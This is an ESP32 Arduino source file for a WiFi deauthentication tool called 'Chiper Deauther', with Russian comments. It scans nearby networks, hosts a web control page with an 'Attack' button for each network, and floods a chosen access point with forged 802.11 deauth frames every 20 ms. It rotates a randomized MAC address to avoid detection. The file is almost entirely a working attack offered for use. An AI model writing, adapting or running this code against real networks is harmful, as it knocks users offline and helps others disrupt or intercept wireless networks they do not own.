#include <Arduino.h>
#include <WiFi.h>
#include <esp_wifi.h>
#include <AsyncTCP.h>
#include <ESPAsyncWebServer.h>

// ========== НАСТРОЙКИ ==========
#define AP_SSID     "ChiperDeauther"
#define AP_PASS     "12345678"
#define DEAUTH_REASON 0x0007

AsyncWebServer server(80);

// Глобальные переменные
bool attackRunning = false;
String targetBSSID = "";
int targetChannel = 1;
unsigned long lastChannelHop = 0;
unsigned long lastMacRotate = 0;
unsigned long lastPacket = 0;
uint8_t currentMac[6];
int packetCount = 0;

// Прототипы
void startAttack(String bssid, int channel);
void stopAttack();
void sendDeauthPacket(uint8_t* bssid);
void rotateMac();
void hopChannel();
String scanNetworksHTML();
String getStatusHTML();

// ========== ГЕНЕРАЦИЯ СЛУЧАЙНОГО MAC ==========
void generateRandomMac(uint8_t* mac) {
    for (int i = 0; i < 6; i++) {
        mac[i] = esp_random() & 0xFF;
    }
    mac[0] = (mac[0] & 0xFC) | 0x02; // локальный, не multicast
}

// ========== РОТАЦИЯ MAC ==========
void rotateMac() {
    // Временно выходим из promiscuous режима
    esp_wifi_set_promiscuous(false);
    delay(10);
    
    generateRandomMac(currentMac);
    esp_wifi_set_mac(WIFI_IF_STA, currentMac);
    
    // Возвращаем promiscuous режим
    esp_wifi_set_promiscuous(true);
    
    Serial.print("[MAC] Rotated to: ");
    for (int i = 0; i < 6; i++) {
        Serial.printf("%02X", currentMac[i]);
        if (i < 5) Serial.print(":");
    }
    Serial.println();
}

// ========== ПЕРЕКЛЮЧЕНИЕ КАНАЛА ==========
void hopChannel() {
    targetChannel = (targetChannel % 11) + 1; // 1-11
    esp_wifi_set_channel(targetChannel, WIFI_SECOND_CHAN_NONE);
    Serial.printf("[CH] Hop to channel %d\n", targetChannel);
}

// ========== ОТПРАВКА DEAUTH ПАКЕТА ==========
void sendDeauthPacket(uint8_t* bssid) {
    uint8_t deauthPacket[26] = {
        0xC0, 0x00, 0x00, 0x00,  // Frame Control, Duration
        0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,  // Destination (broadcast)
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00,  // Source (заполнится)
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00,  // BSSID (заполнится)
        0x00, 0x00,                    // Sequence
        DEAUTH_REASON & 0xFF, (DEAUTH_REASON >> 8) & 0xFF
    };
    
    // Заполняем source и bssid
    memcpy(&deauthPacket[10], currentMac, 6);
    memcpy(&deauthPacket[16], bssid, 6);
    
    esp_wifi_80211_tx(WIFI_IF_STA, deauthPacket, sizeof(deauthPacket), false);
    packetCount++;
}

// ========== ЗАПУСК АТАКИ ==========
void startAttack(String bssid, int channel) {
    if (attackRunning) stopAttack();
    
    targetBSSID = bssid;
    targetChannel = channel;
    
    // Парсим BSSID для отправки
    uint8_t bssidBytes[6];
    sscanf(bssid.c_str(), "%02hhx:%02hhx:%02hhx:%02hhx:%02hhx:%02hhx",
           &bssidBytes[0], &bssidBytes[1], &bssidBytes[2],
           &bssidBytes[3], &bssidBytes[4], &bssidBytes[5]);
    
    // Останавливаем AP режим
    WiFi.softAPdisconnect(true);
    WiFi.mode(WIFI_MODE_STA);
    delay(100);
    
    // Включаем promiscuous режим
    esp_wifi_set_promiscuous(true);
    
    // Генерируем стартовый MAC
    generateRandomMac(currentMac);
    esp_wifi_set_mac(WIFI_IF_STA, currentMac);
    
    // Устанавливаем канал
    esp_wifi_set_channel(targetChannel, WIFI_SECOND_CHAN_NONE);
    
    attackRunning = true;
    lastChannelHop = millis();
    lastMacRotate = millis();
    packetCount = 0;
    
    Serial.println("[ATTACK] Started");
}

// ========== ОСТАНОВКА АТАКИ ==========
void stopAttack() {
    if (!attackRunning) return;
    
    attackRunning = false;
    esp_wifi_set_promiscuous(false);
    
    // Возвращаем AP режим
    WiFi.mode(WIFI_AP);
    WiFi.softAP(AP_SSID, AP_PASS);
    
    Serial.println("[ATTACK] Stopped");
}

// ========== СКАНИРОВАНИЕ СЕТЕЙ (HTML) ==========
String scanNetworksHTML() {
    String html = "<ul style='list-style:none;padding:0'>";
    int n = WiFi.scanNetworks();
    for (int i = 0; i < n && i < 30; i++) {
        html += "<li style='margin:8px 0;padding:8px;background:#1e1e1e;border-radius:4px;'>";
        html += "<b>" + WiFi.SSID(i) + "</b><br>";
        html += "<small>BSSID: " + WiFi.BSSIDstr(i) + " | Ch: " + WiFi.channel(i) + " | RSSI: " + WiFi.RSSI(i) + " dBm</small><br>";
        html += "<button onclick='start(\"" + WiFi.BSSIDstr(i) + "\"," + WiFi.channel(i) + ")'>Attack</button>";
        html += "</li>";
    }
    html += "</ul>";
    WiFi.scanDelete();
    return html;
}

// ========== СТАТУС (HTML) ==========
String getStatusHTML() {
    String html = "<div><b>Attack:</b> ";
    html += attackRunning ? "<span style='color:#ff4444'>ACTIVE</span>" : "<span style='color:#44ff44'>IDLE</span>";
    html += "</div>";
    if (attackRunning) {
        html += "<div><b>Target:</b> " + targetBSSID + "</div>";
        html += "<div><b>Channel:</b> " + String(targetChannel) + "</div>";
        html += "<div><b>Packets sent:</b> " + String(packetCount) + "</div>";
        html += "<div><b>MAC:</b> ";
        for (int i = 0; i < 6; i++) {
            html += String(currentMac[i], HEX);
            if (i < 5) html += ":";
        }
        html += "</div>";
    }
    return html;
}

// ========== HTML СТРАНИЦА ==========
const char index_html[] PROGMEM = R"rawliteral(
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <title>Chiper Deauther</title>
    <style>
        body { font-family: monospace; background: #0a0a0a; color: #0f0; padding: 20px; }
        h1 { color: #0ff; border-bottom: 1px solid #333; }
        .card { background: #1a1a1a; border: 1px solid #333; border-radius: 8px; padding: 15px; margin: 15px 0; }
        button { background: #0f0; color: #000; border: none; padding: 8px 16px; border-radius: 4px; cursor: pointer; font-weight: bold; margin: 5px; }
        .stop-btn { background: #f44; }
        .status { margin: 10px 0; padding: 10px; background: #111; border-radius: 4px; }
        #networks { max-height: 400px; overflow-y: auto; }
    </style>
</head>
<body>
    <h1>🛡️ Chiper Deauther</h1>
    
    <div class="card">
        <h3>⚡ Attack Control</h3>
        <button id="stopBtn" class="stop-btn" onclick="stop()" disabled>Stop Attack</button>
        <div id="status" class="status">Loading...</div>
    </div>
    
    <div class="card">
        <h3>📡 WiFi Networks</h3>
        <button onclick="scan()">🔄 Scan Networks</button>
        <div id="networks">Click scan to load...</div>
    </div>

    <script>
        async function api(endpoint, data = null) {
            try {
                let url = endpoint;
                if (data) {
                    url += '?' + new URLSearchParams(data);
                }
                const res = await fetch(url);
                return await res.text();
            } catch(e) {
                console.error(e);
                return null;
            }
        }

        async function scan() {
            document.getElementById('networks').innerHTML = 'Scanning...';
            const html = await api('/scan');
            document.getElementById('networks').innerHTML = html;
        }

        async function start(bssid, channel) {
            const res = await api('/start', { bssid: bssid, channel: channel });
            if (res === 'OK') {
                document.getElementById('stopBtn').disabled = false;
                updateStatus();
            }
        }

        async function stop() {
            await api('/stop');
            document.getElementById('stopBtn').disabled = true;
            updateStatus();
        }

        async function updateStatus() {
            const status = await api('/status');
            document.getElementById('status').innerHTML = status;
        }

        setInterval(updateStatus, 2000);
        scan();
        updateStatus();
    </script>
</body>
</html>
)rawliteral";

// ========== ВЕБ-СЕРВЕР ==========
void setupWebServer() {
    server.on("/", HTTP_GET, [](AsyncWebServerRequest *request) {
        request->send_P(200, "text/html", index_html);
    });
    
    server.on("/scan", HTTP_GET, [](AsyncWebServerRequest *request) {
        request->send(200, "text/html", scanNetworksHTML());
    });
    
    server.on("/start", HTTP_GET, [](AsyncWebServerRequest *request) {
        if (request->hasParam("bssid") && request->hasParam("channel")) {
            String bssid = request->getParam("bssid")->value();
            int channel = request->getParam("channel")->value().toInt();
            startAttack(bssid, channel);
            request->send(200, "text/plain", "OK");
        } else {
            request->send(400, "text/plain", "Missing bssid or channel");
        }
    });
    
    server.on("/stop", HTTP_GET, [](AsyncWebServerRequest *request) {
        stopAttack();
        request->send(200, "text/plain", "OK");
    });
    
    server.on("/status", HTTP_GET, [](AsyncWebServerRequest *request) {
        request->send(200, "text/html", getStatusHTML());
    });
}

// ========== SETUP ==========
void setup() {
    Serial.begin(115200);
    delay(1000);
    
    Serial.println("\n[BOOT] Chiper Deauther v2.0");
    
    // AP режим для управления
    WiFi.mode(WIFI_AP);
    WiFi.softAP(AP_SSID, AP_PASS);
    Serial.printf("[AP] %s | IP: 192.168.4.1\n", AP_SSID);
    
    setupWebServer();
    server.begin();
    
    Serial.println("[WEB] Server ready");
}

// ========== LOOP ==========
void loop() {
    if (attackRunning) {
        unsigned long now = millis();
        
        // Ротация MAC каждые 15 секунд
        if (now - lastMacRotate >= 15000) {
            rotateMac();
            lastMacRotate = now;
        }
        
        // Переключение канала каждые 5 секунд (медленная ротация для охвата)
        if (now - lastChannelHop >= 5000) {
            hopChannel();
            lastChannelHop = now;
        }
        
        // Отправка пакетов (задержка 20 мс)
        if (now - lastPacket >= 20) {
            uint8_t bssid[6];
            sscanf(targetBSSID.c_str(), "%02hhx:%02hhx:%02hhx:%02hhx:%02hhx:%02hhx",
                   &bssid[0], &bssid[1], &bssid[2],
                   &bssid[3], &bssid[4], &bssid[5]);
            sendDeauthPacket(bssid);
            lastPacket = now;
        }
    }
    
    delay(1); // Не грузим CPU
}
